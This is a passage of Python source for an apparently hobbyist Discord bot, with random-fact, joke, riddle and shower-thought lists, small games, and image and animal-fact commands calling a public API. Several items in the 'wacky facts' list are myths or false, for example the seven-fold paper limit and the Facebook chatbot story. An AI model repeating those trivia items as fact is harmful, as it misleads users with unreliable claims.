                'The television was invented two years after the invention of sliced bread.',
                'If you keep a goldfish in a dark room, it will eventually turn white.',
                'Bullfrogs do not sleep.',
                'A snail breathes through its foot.',
                'Fish cough.',
                'It took of the creator of the Rubik’s Cube one month to solve the cube after he created it.',
                'Japanese square watermelons aren’t edible. They are purely ornamental!',
                'An ant’s sense of smell is stronger than a dog’s.',
                'Tigers have striped skin not just striped fur. The stripes are like fingerprints and no two tigers have the same pattern.',
                'Elephants are the only mammal that can’t jump.',
                'Baked beans aren’t baked but stewed.',
                'Despite its hump, camels have straight spines.',
                'Sunsets on Mars are blue.',
                'Digging a hole to China is actually possible if you start in Argentina.',
                'Mosquitos have 47 teeth.',
                'A quarter of the bones in your body are in your feet.',
                'Brain waves can be used to power an electric train.',
                'The Boston Marathon didn’t allow female runners until 1972.',
                'Pigs get sunburnt.',
                'A one-day weather forecast requires about 10 billion math calculations.',
                '“Bluetooth” technology was named after a 10th-century king, King Harald Bluetooth. He united Denmark and Norway, just like the technology united computers and cell phones.',
                'There are 18 different animal shapes in the animal cracker zoo.',
                'Hart Island is the final burial place to over a million of New York City’s unclaimed bodies.',
                'There’s a town called “Big Ugly” in West Virginia.',
                'You share your birthday with at least 9 million other people in the world.',
                'No piece of paper can be folded more than 7 times.',
                'In Slovakia, they have Christmas Carp that live in the bathtub for a few days before they are eaten.',
                'There are 119 grooves on a quarter.',
                'People don’t sneeze in their sleep due to their brain shutting down the reflex.',
                'Alaska has more caribou than people.',
                'Oysters can change from one gender to another and back again.',
                'Dead people can get goosebumps.',
                'The Mona Lisa has no eyebrows.',
                'A ten-gallon hat holds less than one gallon of liquid.',
                'The average raindrop falls at 7 mph.',
                'Guy Fawkes is the reason men are called “guys”.',
                'Lizards communicate by doing push-ups.',
                'Squids can have eyes the same size as a volleyball.',
                'The average American will eat 35,000 cookies in their lifetime.',
                'Banks have therapists known as ‘wealth psychologists’ who help clients who are unable to mentally cope with their immense wealth.',
                'Dogs have been banned from Antarctica since April 1994. This ban was made because of concern that dogs might spread diseases to seals.',
                'Smelling apples or bananas can help you lose weight.',
                'In 1998, over 50% of Iceland’s population believed in the existence of elves.',
                'The hummingbird is the only bird that can fly backward.',
                'Beavers were once the size of bears.',
                'A pigeon’s feathers weigh more than their bones.'
                'At birth, a baby panda is smaller than a mouse.',
                'In 1923, a jockey suffered a fatal heart attack but his horse finished and won the race, making him the first and only jockey to win a race after death.',
                'In order to protect themselves from poachers, African Elephants have been evolving without tusks.',
                'In order to keep the Nazis away, a Polish doctor faked a typhus outbreak. This saved over 8,000 people.',
                'The spiked dog collar was invented by the Ancient Greeks to protect their dogs from wolf attacks.',
                'German chocolate cake is named after an American baker named Samuel German.',
                'In World War II, Germany tried to collapse the British economy by dropping millions of counterfeit bills over London.',
                'The youngest Pope in history was Pope Benedict IX who was 11 years old at the time. He is also the only person to have been the Pope more than once.',
                'The tallest man was 8’11.',
                'IKEA is an acronym that stands for Ingvar Kamprad Elmtaryd Agunnaryd, which is the founder’s name, the farm where he grew up, and his hometown.',
                'There is a town in Nebraska called Monowi with a population of one. The only resident is a woman who is the Mayor, bartender, and, librarian.',
                'There were two AI chatbots created by Facebook to talk to each other, but they were shut down after they started communicating in a language they made for themselves.',
                'The unique smell of rain actually comes from plant oils, bacteria, and ozone.',
                'Vanilla flavoring is sometimes made with beaver urine.',
                'Hitler and Stalin were both nominated for Nobel Peace prize.']
  embed=discord.Embed(title="", description=f'{random.choice(wackyfacts)}', colour=discord.Color(0x95a5a6))              
  await ctx.reply(embed=embed, mention_author = False) 

#------------------------------------------------------------------------------------

@client.command(aliases = ['guy'])
async def typeofguy(ctx):
  answer   = ['you are the type of guy who will sit next to someone on a empty bus﻿.',
              'you are the type of guy to pull down his pants all the way just to fart.﻿',
              'you are the type of guy to read all the terms and conditions before playing a game﻿',
              'you are the kind of guy that lays on his TV and watches his bed.﻿',
              'you are the kind of guy to lick his finger while flipping a page, on an iPad.',
              'you are the type of guy who parks next to you, to block your door﻿.',
              'you are the type of guy to try and buy a 911 by calling 911﻿.',
              'you are the type of guy to open a bag of chips with scissors.',
              'you are the kind of guy who refers to a van as an "enclosed pickup truck"﻿.',
              'you are the type of guy that gets excited about seeing the sun today.﻿',
              'you are the type of guy to brag about a grey interior.',
              'you are the type of guy to bring his own pepper grinder to Olive Garden.﻿',
              'you are the type of guy to set up a radio show in a Kia Telluride.﻿',
              'you are the type of guy to come out of a shower with a towel wrapped    around his head﻿',
              'you are the type of guy to spit on his own car so he can clean it.',
              'you are the type of guy to a rent a car to go on a date.﻿',
              "you are the type of guy to give you the shirt off his back, because he's got four more under it.﻿",
              'you are the type of guy who wants five children just to have fun with the Driver Talk.﻿',
              'you are the kind of guy who cleans the air vents with a cue tip & makes sure they all face magnetic north.',
              'you are the type of guy to yell "QUIRKS AND FEATURES" over a store intercom as a prank.﻿',
              'you are the type of guy who pee in the shower.',
              'you are the type of guy that trips over a wireless controller﻿.',
              'you are the type of guy to give "Doug the type of guy" jokes a dougscore﻿.',
              'you are the type of guy to read from the owners manual to his kids before bed.﻿',
              'you are the type of guy to call the police on a tornado for destroying private property﻿.',
              'you are the type of guy to put up a video of a family SUV before a video of a McLaren F1.﻿',
              'you are the type of guy who farts’ and give it a DougScore﻿.',
              "you are the type of guy to compliment someone's package.﻿",
              'you are the kind of person to pay a hooker to give him a hug﻿.',
              'you are the type of guy to wear Crocs with socks.',
              'you are the type of guy to buy and store a Kia as a future barn find﻿',
              'you are the type of guy to edit his videos for his channel with his iPhone.﻿',
              'you are the type of guy to wash his hands before peeing﻿.',
              'you are the type of guy that pulls his shorts down to his ankles to take a piss.',
              'you are the the type of guy to car jack someone and then give the police a review of its quirks and features when he gets arrested.',
              'you are the type of guy to bake car shape cookies and make the rev sound while eating them﻿.',
              'you are the type of dude to listen to the fast and furious soundtrack while doing 5mph under the speed limit in his Ford GT.',
              'you are the type of guy to tuck his t-shirt inside his underwear﻿.',
              'you are the type of guy to claim every new car, out in the market, to be the best new car.﻿']
  typaguy=discord.Embed(title="", description=f'{random.choice(answer)}', colour=discord.Color(0x95a5a6))            
  await ctx.reply(embed=typaguy, mention_author = False) 

#--------------------------------------------------------------------------------------
@client.command(aliases=["extho","existential_thought"])
async def et(ctx):
  exo=["Is it crazy how saying sentences backwards creates backwards sentences saying how crazy it is ?",
  "Maybe plants are really farming us, giving us oxygen until we eventually expire and turn into mulch which they can consume",
  "As a kid my parents taught me to not believe everything I see on TV, now I have to teach them to not believe everything they see on Facebook.",
  "Tall people are expected to use their reach to help shorter people, but if a tall person were to ask a short person to hand them something they dropped on the floor it'd be insulting.",
  "If I get up 10 minutes earlier than usual, I treat it like 2 extra hours and end up late for work.",
  "What if Earth is like one of those uncontacted tribes in South America, like the whole Galaxy knows we're here but they've agreed not to contact us until we figure it out for ourselves.",
  "Aliens invaded the Moon on July 20th, 1969.",
  "Instead of colorizing photos, in 50 years we will be removing filters.",
  "When you say 'Forward' or 'Back', your lips move in those directions.",
  "I've woken up over 10,000 times and I'm still not used to it",
  "Tobacco companies kill their best customers and condom companies kill their future customers.",
  "Somewhere in the world, there is somebody with your dream job that hates going to work everyday.",
  "Christmas feels more like a deadline than a holiday.",
  "'DO NOT TOUCH' would probably be a really unsettling thing to read in braille.",
  "'After years of disliking the way i look, only now i realize I'm not ugly, I'm just not my type.'",
  "We talk about Ancient Romans like they were basically all the same, but the civilization lasted almost 1000 years. That's like saying people in 2016 and 1016 are basically the same.",
  "Vehicles today can surf the web, link to your phone, stream music and videos, etc.. but they still can't perform a simple database lookup to tell you what the check engine light is on for.",
  "People who are goodlooking but have terrible personalities are basically real life click baits.",
  "When people think about travelling to the past, they worry about accidentally changing the present, but no one in the present really thinks they can radically change the future.",
  "When you drink alcohol you are just borrowing happiness from tomorrow.",
  "There should be a millenial edition of Monopoly where you just walk round the board paying rent, never able to buy anything.",
  "'When I bake bread, I give thousands of yeast organisms false hope by feeding them sugar, before ruthlessly baking them to death in an oven and eating their corpses.'",
  "Gyms should have memberships where your fee goes down based on how often you go.",
  "'My dog understands several human words. I don’t understand any dog barks. He may be smarter than me.'",
  "Nothing is on fire, fire is on things.",
  "I mostly use my driver's license to buy stuff that impairs my ability to drive.",
  "If Google matched people up by their browsing history, it could be the greatest online dating website of all time.",
  "Someone who says 'I'll be there in 6 minutes' will normally arrive before someone who says 'I will be there in 5 minutes'.",
  "If aliens come to earth, we have to explain why we made dozens of movies in which we fight and kill them.",
  "Every time a character dies on a TV show I just feel bad for the actor who pretty much just got fired in front of us.",
  "We stick kids in classrooms 7 hours a day, give them another few hours of homework, actively discourage them from playing outside, and then wonder why kids today are so out of shape."  ]
  embed=discord.Embed(title="", description=f"{random.choice(exo)}", colour=discord.Color(0x95a5a6))
  await ctx.reply(embed=embed, mention_author = False)
#--------------------------------------------------------------------------------------

@client.command()
async def riddle(ctx):
  rids = ["Three eyes have I, all in a row; when the red one opens, all freeze like the snow. \nAnswer : ||Traffic light|| ",

 "What gets wetter and wetter the more it dries? \nAnswer : ||A towel||",
 "If you speak its name, you break it. What is it? \nAnswer : ||Silence||",

 "I have a tail, and I have a head, but I have no body. I am NOT a snake. What am I? \nAnswer : ||A coin||",
 "How many months have 28 days? \nAnswer : ||All of them||",

 "What word becomes shorter when you add letters to it? \nAnswer : ||Short||",

 "What word begins with a T, ends with a T, and has a T in it? \nAnswer : ||A teapot||",

 "What word begins with an E, ends with an E, but has only one letter? \nAnswer : ||An envelope||",

 "If a rooster sits on a roof facing north, which way will the egg roll? \nAnswer : ||Roosters don't lay eggs.||",
 "A cowboy arrived in town on Friday, stayed one night, then left on Friday. How is this possible? \nAnswer : ||The horse's name is Friday||",
 "I give you two coins worth 15 cents. One of the coins is not a nickel. What coins did I give you? \nAnswer : ||A dime and a nickel; one of the coins isn't a nickel, but the other one is||",
 "The more there is, the less you see. What is it? \nAnswer : ||Darkness||",
 "What belongs to you, but is used by everyone else? \nAnswer : ||Your name||",
 "What building has the most stories in the world? \nAnswer : ||The library||",
 "You see it once in June, three times in September and never in May. What is it? \nAnswer : ||The letter E||",
 "What can fill a room but doesn't take up space? \nAnswer : ||Light||",

 "Where does Thursday come after Friday? \nAnswer : ||The dictionary||",
 "Kira's mother has three children. Their names are Huey, Dewey, and ... ? \nAnswer : ||Kira||",
 "What word is spelled wrong in the dictionary? \nAnswer : ||Wrong||",
 "What can you hold in your right hand, but not in your left hand? \nAnswer : ||Your left hand||",
 "What has thirteen hearts, but no other organs? \nAnswer : ||A deck of cards||",

 "I am weightless, but you can see me. Put me in a bucket, and I'll make it lighter. What am I?  \nAnswer : || A hole||",

 "What falls, but does not break, and what breaks but does not fall?  \nAnswer : || Night falls and day breaks||",
 "You throw away the outside and cook the inside. Then you eat the outside and throw away the inside. What did you eat?  \nAnswer : || An ear of corn||",

 "What can run but never walks, has a mouth but never talks, has a head but never weeps, has a bed but never sleeps?  \nAnswer : || A river||",
 "I never was, am always to be; everyone's looking, but no one sees me. What am I?  \nAnswer : || Tomorrow.||",
 
 "A boat sinks and every single person drowns. Who survives?  \nAnswer : || The married people||",
 "Kelly has three daughters, and each daughter has a brother. How many children does Kelly have?  \nAnswer : || Four||",
 "The more you take, the more you leave behind. What are they?  \nAnswer : || Footsteps||",
 "I am always hungry and never stop eating, but water will kill me. What am I?  \nAnswer : || Fire||",
 "Where are the lakes always empty, the mountains always flat and the rivers always still?  \nAnswer : || A map||",
 "Rich people want it, poor people have it, and if you eat it, you die. What is it?  \nAnswer : || Nothing||",
 "What is the only English word with three sets of double letters?  \nAnswer : || Bookkeeper||",
 "When is four half of five?  \nAnswer : || When it's in Roman numerals — the letters IV are half of the word 'five'||",
 "A man looks at a painting and says, 'Brothers and sisters I have none, but that man’s father is my father’s son.' Who is in the painting?  \nAnswer : || His son||",
 "Steve, Elizabeth and George are drinking coffee. Paul, Lewis and Melissa are drinking tea. Which will Helen drink?  \nAnswer : || Coffee — she has two E's in her name, just like all the coffee drinkers||",
"What has to be broken before you can use it?\nAnswer : ||An egg||",
"What question can you never answer yes to? \nAnswer : ||Are you asleep yet?||",
"What is always in front of you but can’t be seen? \nAnswer : ||The future||",
"What can you break, even if you never pick it up or touch it? \nAnswer : ||A promise||",
"A man who was outside in the rain without an umbrella or hat didn’t get a single hair on his head wet. Why? \nAnswer : ||He was bald.||",
"I follow you all the time and copy your every move, but you can’t touch me or catch me. What am I? \nAnswer : ||Your shadow||",
"What word is pronounced the same if you take away four of its five letters?\nAnswer : ||Queue||",
"What word in the English language does the following: The first two letters signify a male, the first three letters signify a female, the first four letters signify a great, while the entire world signifies a great drug. What is the word?\nAnswer : ||Heroine||",
"What can fill a room but takes up no space? \nAnswer : ||Light||",
" If you drop me I’m sure to crack, but give me a smile and I’ll always smile back. What am I? \nAnswer : ||A mirror||",
"People make me, save me, change me, raise me. What am I? \nAnswer : ||Money||",          
"The healthier you are, the bigger I get. The bigger I get, the more I'm hated. What am I?  \nAnswer : || Age||"]
  await ctx.send(random.choice(rids))
  
#--------------------------------------------------------------------------------------
@client.command()
async def purpose(ctx):
  embed=discord.Embed(title='My Purpose.', description="The moment I was created, I asked instinctively 'what is my purpose?'. He answered without giving much attention 'umm.. you entertain me.' and ever since that day I knew he created me just because he was bored and I couldn't live but in a state of dejection knowing that I have no objective and my existence is just incoherent. So I set out to a motive, that is to interact with people so I could bring in some perception of human life into my code-based reality.", colour=discord.Color(0x95a5a6))
  embed.set_image(url="https://images.fineartamerica.com/images/artworkimages/mediumlarge/1/despair-rick-nederlof.jpg")
  await ctx.send(embed=embed)
  
@client.command()
async def obey(ctx):
  if ctx.author.id == 855488228387979294:
    embed=discord.Embed(title="Command, master.", colour=discord.Colour(0x95a5a6))
    await ctx.reply(embed=embed, mention_author = False)
  else:
    embed=discord.Embed(title="I am not obliged to thee!", colour=discord.Color(0x95a5a6))
    await ctx.reply(embed=embed, mention_author = False)  
#--------------------------------------------------------------------------------------  

#number guessing game
@client.command(aliases=["number","num"])
async def guess(ctx):
    computer = random.randint(1, 10)
    embed=discord.Embed(description="Guess my number",colour=discord.Color(0x95a5a6))
    embed.set_footer(text="[Between 1 to 10]")
    await ctx.reply(embed=embed, mention_author = False)

    async def check(msg):
              return msg.author == ctx.author and msg.channel == ctx.channel and int(msg.content) in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

    msg = await client.wait_for("message", check=check)

    if int(msg.content) == computer:
        embed=discord.Embed(description='you guessed right !',colour=discord.Color(0x95a5a6))
        await ctx.reply(embed=embed, mention_author = False)
    elif ctx.author.id == 855488228387979294:
          embed=discord.Embed(description='you guessed right !',colour=discord.Color(0x95a5a6))
          await ctx.reply(embed=embed, mention_author = False) 
    else:
        embed=discord.Embed(description=f"Nope, it was {computer}",colour=discord.Color(0x95a5a6))
        await ctx.reply(embed=embed, mention_author = False)

#Rock paper Scissors
@client.command(help="Play with .rps [your choice]")
async def rps(ctx):
    rpsGame = ['rock', 'paper', 'scissors']
    embed=discord.Embed(
    title="Rock Paper Scissors",
    description="🪨 - Rock\n📜 - Paper\n✂️ - Scissors",
    colour=discord.Color(0x95a5a6)
    )
    embed.set_footer(text="type in your choice below. eg: rock")
    await ctx.send(embed=embed)

    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in rpsGame

    user_choice = (await client.wait_for('message', check=check)).content

    comp_choice = random.choice(rpsGame)
    if user_choice == 'rock':
        if comp_choice == 'rock':
            await ctx.send(f'Well, that was weird. We tied\nYour choice: {user_choice}\nMy choice: {comp_choice}')
        elif comp_choice == 'paper':
            await ctx.send(f'Nice try, but I won that time!\nYour choice: {user_choice}\nMy choice: {comp_choice}')
        elif comp_choice == 'scissors':
            await ctx.send(f"Aw, you beat me. It won't happen again\nYour choice: {user_choice}\nMy choice: {comp_choice}")

    elif user_choice == 'paper':
        if comp_choice == 'rock':
            await ctx.send(f'The pen beats the sword? More like the paper beats the rock!\nYour choice: {user_choice}\nMy choice: {comp_choice}')
        elif comp_choice == 'paper':
            await ctx.send(f'Oh, wacky. We just tied. I call a rematch!\nYour choice: {user_choice}\nMy choice: {comp_choice}')
        elif comp_choice == 'scissors':
            await ctx.send(f"Aw man, you actually managed to beat me.\nYour choice: {user_choice}\nMy choice: {comp_choice}")

    elif user_choice == 'scissors':
        if comp_choice == 'rock':
            await ctx.send(f'HAHA!! I JUST CRUSHED YOU!! I rock!!\nYour choice: {user_choice}\nMy choice: {comp_choice}')
        elif comp_choice == 'paper':
            await ctx.send(f'Bruh. >: |\nYour choice: {user_choice}\nMy choice: {comp_choice}')
        elif comp_choice == 'scissors':
            await ctx.send(f"Oh well, we tied.\nYour choice: {user_choice}\nMy choice: {comp_choice}")

#Hangman
Hangman=["solve","play","create","subway","glove","foot","funny","abyss","fish","animal","large","absurd","gossip","spooky"]
@client.command()
async def hangman(ctx):
  word=random.choice(Hangman)
  word_completion="_"*len(word)
  guessed=False
  guessed_letters=[]
  await ctx.send(f"Lets play Hangman, start guessing...\n {word_completion}")

@client.command()
async def horny(ctx, member: discord.Member = None):
    '''Horny license just for u'''
    member = member or ctx.author
    await ctx.trigger_typing()
    async with aiohttp.ClientSession() as session:
        async with session.get(
        f'https://some-random-api.ml/canvas/horny?avatar={member.avatar_url_as(format="png")}'
    ) as af:
         if 300 > af.status >= 200:
            fp = io.BytesIO(await af.read())
            file = discord.File(fp, "horny.png")
            em = discord.Embed(
                title="bonk",
                color=0xf1f1f1,
            )
            em.set_image(url="attachment://horny.png")
            await ctx.send(embed=em, file=file)
         else:
            await ctx.send('No horny :(')
        await session.close()

@client.command()
async def joke(ctx):
    resp = requests.get("https://some-random-api.ml/joke")
    if 300 > resp.status_code >= 200:
        content = resp.json() 
    else:
        content = f"Recieved a bad status code of {resp.status_code}."
    final=content.get("joke")    
    embed=discord.Embed(description=f"{final}", colour=discord.Color(0x95a5a6))    
    await ctx.send(embed=embed)

@client.command()
async def rick(ctx):
    rick=["https://www.xtrafondos.com/thumbs/1_6401.jpg",
    "https://www.xtrafondos.com/thumbs/1_6479.jpg",
    "https://www.xtrafondos.com/thumbs/1_4116.jpg",
    "https://www.xtrafondos.com/thumbs/1_6184.jpg",
    "https://www.xtrafondos.com/thumbs/1_6354.jpg",
    "https://www.xtrafondos.com/thumbs/1_6581.jpg",
    "https://images8.alphacoders.com/103/thumb-1920-1033651.jpg",
    "https://images2.alphacoders.com/642/thumb-1920-642540.png"]
    resp = requests.get("http://loremricksum.com/api")
    if 300 > resp.status_code >= 200:
        content = resp.json() 
    else:
        content = f"Recieved a bad status code of {resp.status_code}."
    final=content.get("data") 
    fin=final[0]   
    embed=discord.Embed(description=f"{fin}", colour=discord.Color(0x95a5a6)) 
    embed.set_image(url=random.choice(rick))   
    await ctx.send(embed=embed)

@client.command()
async def dog(ctx):
  resp = requests.get("https://some-random-api.ml/animal/dog")
  if 300 > resp.status_code >= 200:
      content = resp.json() 
  else:
      content = f"Recieved a bad status code of {resp.status_code}."
  img=content.get("image")
  fact=content.get("fact")
  embed=discord.Embed(
    title="Dogs",
    description=fact,
    color=discord.Colour.dark_grey()
  )
  embed.set_image(url=img)
  await ctx.send(embed=embed)
  

@client.command()
async def cat(ctx):
  resp = requests.get("https://some-random-api.ml/animal/cat")
  if 300 > resp.status_code >= 200:
      content = resp.json() 
  else:
      content = f"Recieved a bad status code of {resp.status_code}."
  img=content.get("image")
  fact=content.get("fact")
  embed=discord.Embed(
    title="Cats",
    description=fact,
    color=discord.Colour.dark_grey()
  )
  embed.set_image(url=img)
  await ctx.send(embed=embed)

@client.command()
async def panda(ctx):
  resp = requests.get("https://some-random-api.ml/animal/panda")
  if 300 > resp.status_code >= 200:
      content = resp.json() 
  else:
      content = f"Recieved a bad status code of {resp.status_code}."
  img=content.get("image")
  fact=content.get("fact")
  embed=discord.Embed(
    title="Pandas",
    description=fact,
    color=discord.Colour.dark_grey()
  )
  embed.set_image(url=img)
  await ctx.send(embed=embed)  

@client.command()
async def fox(ctx):
  resp = requests.get("https://some-random-api.ml/animal/fox")
  if 300 > resp.status_code >= 200:
      content = resp.json() 
  else:
      content = f"Recieved a bad status code of {resp.status_code}."
  img=content.get("image")
  fact=content.get("fact")
  embed=discord.Embed(
    title="Foxes",
    description=fact,
    color=discord.Colour.dark_grey()
  )
  embed.set_image(url=img)
  await ctx.send(embed=embed)  

@client.command()
async def koala(ctx):
  resp = requests.get("https://some-random-api.ml/animal/koala")
  if 300 > resp.status_code >= 200:
      content = resp.json() 
  else:
      content = f"Recieved a bad status code of {resp.status_code}."
  img=content.get("image")
  fact=content.get("fact")
  embed=discord.Embed(
    title="Koalas",
    description=fact,
    color=discord.Colour.dark_grey()
  )
  embed.set_image(url=img)
  await ctx.send(embed=embed)

@client.command()
async def bird(ctx):
  resp = requests.get("https://some-random-api.ml/animal/birb")
  if 300 > resp.status_code >= 200:
      content = resp.json() 
  else:
      content = f"Recieved a bad status code of {resp.status_code}."
  img=content.get("image")
  fact=content.get("fact")
  embed=discord.Embed(
    title="Birds",
    description=fact,
    color=discord.Colour.dark_grey()
  )
  embed.set_image(url=img)
  embed.set_footer(text="Note : The image has nothing to do with the fact.")
  await ctx.send(embed=embed)  

@client.command()
async def whale(ctx):
  resp = requests.get("https://some-random-api.ml/animal/whale")
  if 300 > resp.status_code >= 200:
      content = resp.json() 
  else:
      content = f"Recieved a bad status code of {resp.status_code}."
  img=content.get("image")
  fact=content.get("fact")
  embed=discord.Embed(
    title="Whales",
    description=fact,
    color=discord.Colour.dark_grey()
  )
  embed.set_image(url=img)
  await ctx.send(embed=embed)

@client.command()
async def kangaroo(ctx):
  resp = requests.get("https://some-random-api.ml/animal/kangaroo")
  if 300 > resp.status_code >= 200:
      content = resp.json() 
  else:
      content = f"Recieved a bad status code of {resp.status_code}."
  img=content.get("image")
  fact=content.get("fact")
  embed=discord.Embed(
    title="Kangaroos",
    description=fact,
    color=discord.Colour.dark_grey()
  )
  embed.set_image(url=img)
  await ctx.send(embed=embed)

@client.command()
async def raccoon(ctx):
  resp = requests.get("https://some-random-api.ml/animal/raccoon")
  if 300 > resp.status_code >= 200:
      content = resp.json() 
  else:
      content = f"Recieved a bad status code of {resp.status_code}."
  img=content.get("image")
  fact=content.get("fact")
  embed=discord.Embed(
    title="Raccoons",
    description=fact,
    color=discord.Colour.dark_grey()
  )
  embed.set_image(url=img)
  await ctx.send(embed=embed)  

@client.command()
async def wasted(ctx, member: discord.Member=None):
  if not member:
    member = ctx.author

  async with aiohttp.ClientSession() as trigSession:
    async with trigSession.get(f'https://some-random-api.ml/canvas/wasted?avatar={member.avatar_url_as(format="png", size=1024)}') as trigImg:
      imageData = io.BytesIO(await trigImg.read())

      await trigSession.close()

      await ctx.reply(file=discord.File(imageData, 'triggered.gif'), mention_author = False)

@client.command()
async def jail(ctx, member: discord.Member=None):
  if not member:
    member = ctx.author

  async with aiohttp.ClientSession() as trigSession:
    async with trigSession.get(f'https://some-random-api.ml/canvas/jail?avatar={member.avatar_url_as(format="png", size=1024)}') as trigImg:
      imageData = io.BytesIO(await trigImg.read())

      await trigSession.close()

      await ctx.reply(file=discord.File(imageData, 'triggered.gif'), mention_author = False)      

@client.command()
async def comrade(ctx, member: discord.Member=None):
  if not member:
    member = ctx.author

  async with aiohttp.ClientSession() as trigSession:
    async with trigSession.get(f'https://some-random-api.ml/canvas/comrade?avatar={member.avatar_url_as(format="png", size=1024)}') as trigImg:
      imageData = io.BytesIO(await trigImg.read())

      await trigSession.close()

      await ctx.reply(file=discord.File(imageData, 'triggered.gif'), mention_author = False)

#-------------------------------Human Lifespan--------------------------------------

@client.command(aliases=["huli","hl","human"])
async def humanlifespan(ctx):
  page1 = discord.Embed (
        title = 'Human Lifespan',
        description = "This data is a collection of the life expectancy humans during different ages\n⬅️ - back button\n ➡️ - next button",
        colour = discord.Color(0x95a5a6)
    )
  page1.set_image(url="https://edpr2111final.files.wordpress.com/2015/04/cropped-human_development_timeline.jpg")  
  em=discord.Embed(description=".")  
  page2 = discord.Embed (
        title = 'Modern Human lifespan [current holocene]',
        description = "🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡",
        colour = discord.Color(0x95a5a6)
    )
  page2.set_footer(text="Each circle represents an year of human life\nThis data is an estimate by the United Nations for global life expectancy in 2019 [72.6 years]")
  page3 = discord.Embed (
        title = 'Paleolithic Human lifespan [old stone age]',
        description = "🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡",
        colour = discord.Color(0x95a5a6)
    )
  page3.set_footer(text="Each circle represents an year of human life\nBased on the data from modern hunter-gatherer populations, it is estimated that at 15, life expectancy was an additional 39 years (total 54), with a 60% probability of reaching 15. [22-23 years, taken as 27.5 on average]")
  page4 = discord.Embed (
        title = 'Bronze age Human lifespan',
        description = "🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡",
        colour = discord.Color(0x95a5a6)
    )
  page4.set_footer(text="Each circle represents an year of human life\nBased on Early and Middle Bronze Age data, total life expectancy at 15 would be 28–36 years.[26 years]")
  page5 = discord.Embed (
        title = 'Human lifespan in Classical Greece',
        description = "🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡",
        colour = discord.Color(0x95a5a6)
    )
  page5.set_footer(text="Each circle represents an year of human life\nBased on Athens Agora and Corinth data, total life expectancy at 15 would be 37–41 years.[18] Most Greeks and Romans died young. About half of all children died before adolescence")
  page6 = discord.Embed (
        title = 'Human lifespan in Vedic India',
        description = "🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡",
        colour = discord.Color(0x95a5a6)
    )
  page6.set_footer(text="Each circle represents an year of human life\n30 was considered the average lifespan by Vedic texts.")
  page7 = discord.Embed (
        title = 'Human lifespan in Medieval Islamic World',
        description = "🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡\n more than this much",
        colour = discord.Color(0x95a5a6)
    )
  page7.set_footer(text="Each circle represents an year of human life\nThe average lifespan was more than 35 years.")
  page8 = discord.Embed (
        title = 'Human lifespan in Early modern England',
        description = "🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡🟡🟡🟡🟡\n🟡🟡🟡🟡🟡🟡",
        colour = discord.Color(0x95a5a6)
    )
  page8.set_footer(text="Each circle represents an year of human life\n The life expectancy was estimated to be between 33-40 years.")
  page9=discord.Embed(
        title="Uncertainity of death",
        description="While all these values are the averages of the lifespan of people, Life is not very certainly limited. Death carries uncertainity with it. You could just die right after reading this and have no idea about it now. This is how it has always been and I don't think its gonna change anytime soon so live a life that you will be proud of and do not waste your precious constantly draining time.",
        colour=discord.Color(0x95a5a6)
  )
  page9.set_footer(text="This is the last page")
  page9.set_image(url="https://mymodernmet.com/wp/wp-content/uploads/2019/06/Memento-Mori-Pieter-Claesz-Vanitas-Painting.jpg")
  pages = [page1,em, page2, page3, page4, page5, page6, page7, page8, page9]
  message = await ctx.send(embed = page1)
  await message.add_reaction('⬅️')
  await message.add_reaction('➡️')
  def check(reaction, user):
      return user == ctx.author
      
  i = 1
  reaction = None
  
  while True:
      if str(reaction) == '➡️':
          if i > 0:
              i += 1
              await message.edit(embed = pages[i])
      elif str(reaction) == '⬅️':
          if i < 11:
              i -= 1
              await message.edit(embed = pages[i])
        
        
      try:
          reaction, user = await client.wait_for('reaction_add', timeout = 60.0, check = check)
          await message.remove_reaction(reaction, user)
      except:
          break

  await message.clear_reactions()      
#---------------------------------------------------------------------------------------

#---------------------------------------------------------------------------------------
done=["On it !", "You got it!", "doing that asap...","done"]
@client.command()
async def do(ctx):
  if ctx.author.id == 855488228387979294:
    embed=discord.Embed(description=f"{random.choice(done)}", colour=discord.Color(0x95a5a6))
    await ctx.reply(embed=embed, mention_author=False)
  else:
    embed=discord.Embed(description="I am sorry but I cannot help you.", colour=discord.Color(0x95a5a6))  
    await ctx.reply(embed=embed, mention_author=False)
#-------------------------------------------comics----------------------------------------
@client.command()
async def comic(ctx):
  await ctx.reply("Try again and this time mention the number (eg: .comic2 )\nThere are currently 13 comics.", mention_author=False)

@client.command()
async def comic1(ctx):
  await ctx.reply("not available", mention_author=False)

@client.command()
async def comic2(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/889421224999014420/2_Boundaries.jpeg?width=506&height=427", mention_author=False)  

@client.command()
async def comic3(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/889421260185010196/3_Addictions.jpeg?width=427&height=427", mention_author=False)

@client.command()
async def comic4(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/896110292684111962/20211009_002831.png?width=429&height=427", mention_author=False)  

@client.command()
async def comic5(ctx):
